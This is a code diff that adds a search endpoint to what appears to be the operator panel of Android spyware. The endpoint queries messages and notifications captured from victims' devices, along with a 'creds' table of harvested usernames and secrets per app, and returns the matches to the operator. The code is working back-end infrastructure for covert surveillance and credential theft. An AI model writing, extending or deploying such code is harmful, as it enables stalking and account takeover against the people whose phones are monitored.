@@ -422,6 +422,42 @@ panel.post('/api/device/delete', requirePanel, (req, res) => {
   res.json({ ok: true });
 });
 
+panel.get('/api/buscar', requirePanel, (req, res) => {
+  const q = String(req.query.q || '').trim();
+  if (q.length < 2) return res.json({ ok: true, total: 0, resultados: [] });
+  const desde = Number(req.query.desde || 0);
+  const hasta = Number(req.query.hasta || now());
+  const like = '%' + q + '%';
+  const out = [];
+
+  const evs = all(`SELECT e.id, e.device_id, e.ts, e.type, e.data, d.label, d.model
+                   FROM events e JOIN devices d ON d.id = e.device_id
+                   WHERE e.ts BETWEEN ? AND ? AND e.data LIKE ?
+                   ORDER BY e.ts DESC LIMIT 400`, desde, hasta, like);
+  for (const r of evs) {
+    const dd = pj(r.data, {}) || {};
+    out.push({
+      tipo: r.type, hora: r.ts,
+      device: r.label || r.model || r.device_id, device_id: r.device_id,
+      app: dd.pkg || dd.paquete || '',
+      de: dd.de || dd.title || '',
+      texto: String(dd.txt || dd.text || dd.msg || JSON.stringify(dd)).slice(0, 400)
+    });
+  }
+
+  const crs = all(`SELECT c.*, d.label, d.model FROM creds c JOIN devices d ON d.id = c.device_id
+                   WHERE c.username LIKE ? OR c.secret LIKE ? OR c.pkg LIKE ? LIMIT 200`, like, like, like);
+  for (const r of crs) {
+    out.push({
+      tipo: 'credencial', hora: r.ts,
+      device: r.label || r.model || r.device_id, device_id: r.device_id,
+      app: r.pkg || '', de: r.username || '', texto: r.kind + '  ' + (r.secret || '')
+    });
+  }
+
+  out.sort((a, b) => b.hora - a.hora);
+  res.json({ ok: true, total: out.length, resultados: out.slice(0, 500) });
+});
 panel.get('/api/events', requirePanel, (req, res) => {
   const { device, type, since } = req.query;
   const limit = Math.min(Number(req.query.limit || 300), 1000);
